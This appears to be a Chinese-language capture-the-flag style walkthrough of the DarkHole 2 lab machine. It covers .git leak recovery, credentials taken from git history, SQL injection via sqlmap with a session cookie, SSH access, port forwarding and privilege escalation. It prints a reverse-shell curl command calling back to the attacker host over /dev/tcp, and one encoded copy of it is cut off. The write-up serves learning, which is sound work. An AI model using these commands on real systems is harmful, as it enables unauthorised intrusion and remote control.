## 简介

该文章用来提高小白的基础，记录每次的靶场练习，学习靶场文章的知识点原理以及工具使用。  
抓住知识点理解原理  
靶场IP：192.168.1.185

## 渗透测试

###  ** **扫描IP****

![1652931926_6285bd56adabbd0102544.png!small?1652931929893](https://image.3001.net/images/20220519/1652931926_6285bd56adabbd0102544.png!small?1652931929893)

 ** **扫描端口****

![1652931940_6285bd64b0112fc549a06.png!small?1652931944049](https://image.3001.net/images/20220519/1652931940_6285bd64b0112fc549a06.png!small?1652931944049)

扫描发现22、80端口，还存在.git泄露

 ** **访问.git目录****

![1652931950_6285bd6e93d144b82fe5f.png!small?1652931960804](https://image.3001.net/images/20220519/1652931950_6285bd6e93d144b82fe5f.png!small?1652931960804)

git泄露，上Githack脚本

githack是一个 .git 泄露利用测试脚本,通过泄露文件,还原重建工程源代码

![1652931962_6285bd7a72d46c3b5d480.png!small?1652931965428](https://image.3001.net/images/20220519/1652931962_6285bd7a72d46c3b5d480.png!small?1652931965428)

查看config文件

$connect = new mysqli("localhost","root","","darkhole_2");

得到主机,账号,密码,数据库

查看login.php

> <?php
>
> session_start();
>
> require 'config/config.php';
>
> if($_SERVER['REQUEST_METHOD'] == 'POST'){
>
> $email =
> mysqli_real_escape_string($connect,htmlspecialchars($_POST['email']));
>
> $pass =
> mysqli_real_escape_string($connect,htmlspecialchars($_POST['password']));
>
> $check = $connect->query("select * from users where email='$email' and
> password='$pass' and id=1");
>
> if($check->num_rows){
>
> $_SESSION['userid'] = 1;
>
> header("location:dashboard.php");
>
> die();
>
> }
>
>  
>
>
> }
>
> ?>
>
>  
>
>
> <link rel="stylesheet" href="style/login.css">
>
> <head>
>
> <script src="https://kit.fontawesome.com/fe909495a1.js"
> crossorigin="anonymous"></script>
>
> <link rel="stylesheet" href="Project_1.css">
>
> <title>Home</title>
>
> </head>
>
>  
>
>
> <body>
>
>  
>
>
> <div class="container">
>
> <h1>?? Welcome</h1>
>
> <!-- <a
> href="file:///C:/Users/SAURABH%20SINGH/Desktop/HTML5/PROJECTS/Project%201/Project_1.html"><h1>Sign
> In</h1></a> \-->
>
> <!-- <a
> href="file:///C:/Users/SAURABH%20SINGH/Desktop/HTML5/PROJECTS/Project%201/P2.html">
> <h1>Log In</h1></a> \-->
>
> <form action="" method="post">
>
> <div class="box">
>
> <i class="fas fa-envelope"></i>
>
> <input type="email" name="email" id="email" placeholder="Enter Your Email"
> required>
>
> </div>
>
> <div class="box">
>
> <i class="fas fa-key"></i>
>
> <input type="password" name="password" id="password" placeholder="Enter Your
> Password" required>
>
> </div>
>
> <button id="btn" name="button">Login</button>
>
> </form>
>
>  
>
>
>  
>
>
> </div>

mysqli_real_escape_string转移特殊字符

htmlspecialchars() 函数把一些预定义的字符转换为 HTML 实体。

  

 ** **git信息获取****

换种思路,用wget将.git拉下来,通过查看相关信息获得下一步攻击操作

wget -r http://192.168.1.185/.git

发现没重要信息，git上面会有历史信息

通过git log查看历史版本

![1652932024_6285bdb86b58e1f053567.png!small?1652932027416](https://image.3001.net/images/20220519/1652932024_6285bdb86b58e1f053567.png!small?1652932027416)

查看两次不同的记录

![1652932033_6285bdc186f7086f89778.png!small?1652932036609](https://image.3001.net/images/20220519/1652932033_6285bdc186f7086f89778.png!small?1652932036609)

git diff a4d900a8d85e8938d3601f3cef113ee293028e10

找到登录后台地址和账号密码

 ** **后台渗透****

![1652932043_6285bdcb01a064cf694c5.png!small?1652932046017](https://image.3001.net/images/20220519/1652932043_6285bdcb01a064cf694c5.png!small?1652932046017)

找到后台页面dashboard.php?id=1

![1652932054_6285bdd6b5320f4feeeb9.png!small?1652932057750](https://image.3001.net/images/20220519/1652932054_6285bdd6b5320f4feeeb9.png!small?1652932057750)

尝试id=1'，页面报错

![1652932095_6285bdff8004f84821dd2.png!small?1652932098631](https://image.3001.net/images/20220519/1652932095_6285bdff8004f84821dd2.png!small?1652932098631)

在输入1' --+ 闭合语句,成功

尝试了union select的多种WAF,进行不下去了,掏出SQLMAP跑吧

  

常规的cookie注入

> 库
>
> sqlmap -u "http://192.168.1.185/dashboard.php?id=1" --cookie
> PHPSESSID='svsk4vk4u593chhj9u3kgmkfmi' --current-db
>
> 表
>
> sqlmap -u "http://192.168.1.185/dashboard.php?id=1" --cookie
> PHPSESSID='svsk4vk4u593chhj9u3kgmkfmi' -D "darkhole_2" --tables
>
> 列
>
> sqlmap -u "http://192.168.1.185/dashboard.php?id=1" --cookie
> PHPSESSID='svsk4vk4u593chhj9u3kgmkfmi' -D "darkhole_2" -T 'users' --columns
>
> sqlmap -u "http://192.168.1.185/dashboard.php?id=1" --cookie
> PHPSESSID='svsk4vk4u593chhj9u3kgmkfmi' -D "darkhole_2" -T 'ssh' --columns
>
>  
>
>
> 数据
>
> sqlmap -u "http://192.168.1.185/dashboard.php?id=1" --cookie
> PHPSESSID='svsk4vk4u593chhj9u3kgmkfmi' -D "darkhole_2" -T 'ssh' --dump

![1652932149_6285be354a993779036a0.png!small?1652932152257](https://image.3001.net/images/20220519/1652932149_6285be354a993779036a0.png!small?1652932152257)

  

得到ssh账号密码

SSH登录

ssh jehad@192.168.1.185

![1652932156_6285be3c1d37c0f1e851f.png!small?1652932159052](https://image.3001.net/images/20220519/1652932156_6285be3c1d37c0f1e851f.png!small?1652932159052)

![1652932170_6285be4a6ee567682ef4f.png!small?1652932173446](https://image.3001.net/images/20220519/1652932170_6285be4a6ee567682ef4f.png!small?1652932173446)

###  ** **提权****

查看SUID权限

find / -perm -4000 2>/dev/null

![1652932248_6285be98cb33b8dd7f1a8.png!small?1652932251826](https://image.3001.net/images/20220519/1652932248_6285be98cb33b8dd7f1a8.png!small?1652932251826)

查看用户密码

![1652932260_6285bea490f1dd907a297.png!small?1652932263551](https://image.3001.net/images/20220519/1652932260_6285bea490f1dd907a297.png!small?1652932263551)

![1652932268_6285beacd45a0f7f6e276.png!small?1652932271856](https://image.3001.net/images/20220519/1652932268_6285beacd45a0f7f6e276.png!small?1652932271856)

20.04版本不存在脏牛提权，16倒是有

尝试passwd提权，不行，普通用户没有写权限

![1652932276_6285beb4526e9863bec83.png!small?1652932279406](https://image.3001.net/images/20220519/1652932276_6285beb4526e9863bec83.png!small?1652932279406)

  

 ** **crontab提权****

/etc/crontab文件详解

![1652932301_6285becda084c6f114761.png!small?1652932304885](https://image.3001.net/images/20220519/1652932301_6285becda084c6f114761.png!small?1652932304885)

> Minute hour day month dayofweek command
>
>  
>
>
> Minute :分钟，0-59之间的任何整数。
>
>  
>
>
> Hour：小时， 0-23之间的任何整数。
>
>  
>
>
> Day: 日期，从1到31之间的任意整数(如指定了月份，必须是该月份的有效日期)
>
>  
>
>
> Month：月份，1到12之间的任意整数（或者使用月份的英文简写，如：jan。feb）
>
>  
>
>
> Dayofweek 星期，0到7之间的人任意整数，这里的0或7代表星期日
>
>  
>
>
>  
>
>
>  
>
>
> 25 6 * * * root test -x /usr/sbin/anacron || ( cd / && run-parts --report
> /etc/cron.daily )
>
> test -x /usr/sbin/anacron 表示 “检测文件 /usr/sbin/anacron 是否存在且具有“可执行”权限”
>
> 若 test -x /usr/sbin/anacron 为 true，则不执行 || 后面的命令，若为 false，则执行 || 后面的命令。
>
>  
>
>
> 即，判断系统是否安装了 anacron , 若安装了，则忽略 /etc/crontab 中的这三条定时任务，改为使用 /etc/anacrontab
> 中的配置。

查看定时任务：/etc/crontab

![1652932375_6285bf1734edee9e4ca6a.png!small?1652932378198](https://image.3001.net/images/20220519/1652932375_6285bf1734edee9e4ca6a.png!small?1652932378198)

发现访问不了，可以利用端口转发，将ssh端口映射到kali上面

SSH提供端口转发功能,用户在非安全主机指定端口,非安全主机通过这个端口与安全主机简历连接

ssh -L 127.0.0.1:90:192.168.1.185:9999
[jehad@192.168.1.185](mailto:jehad@192.168.1.185)

![1652932396_6285bf2cf2a0a12753fa3.png!small?1652932399961](https://image.3001.net/images/20220519/1652932396_6285bf2cf2a0a12753fa3.png!small?1652932399961)

且查看/opt/web目录下的index文件,看到cmd,我们可利用cmd反弹shell

![1652932408_6285bf38c77a523fca81d.png!small?1652932412162](https://image.3001.net/images/20220519/1652932408_6285bf38c77a523fca81d.png!small?1652932412162)

kali监听端口4444

curl "http://127.0.0.1:9999/?cmd=bash -c 'exec bash -i
&>/dev/tcp/192.168.1.167/4444 <&1'"

curl执行，进行url编码，使用bp的url编码

curl
"http://127.0.0.1:9999/?cmd=%62%61%73%68%20%2d%63%20%27%65%78%65%63%20%62%61%73%68%20%2d%69%20%26%3e%2f%64%65%76%2f%74%63%70%2f%31%39%32%2e%31%36%

提权成功后,通过sudo -l,密码gang,使用python3执行root shell

##  ** **渗透思路****

 ** **1.目录泄露.git文件****

 ** **2.通过了解git历史记录发现后台账号密码****

 ** **3.参数ID在SQL注入漏洞，拿到SSH账号密码****

 ** **4.通过端口转发，且在/opt/web里发现cmd，可以利用CMD反弹shell****

 ** **5.SUDO -l发现密码，拿python3执行root shell即可****

##  ** **参考****

[crontab提权﻿](https://www.yidc.net/archives/4380)

[Cron Jobs 计划提权﻿](https://blog.csdn.net/q20010619/article/details/121422797)

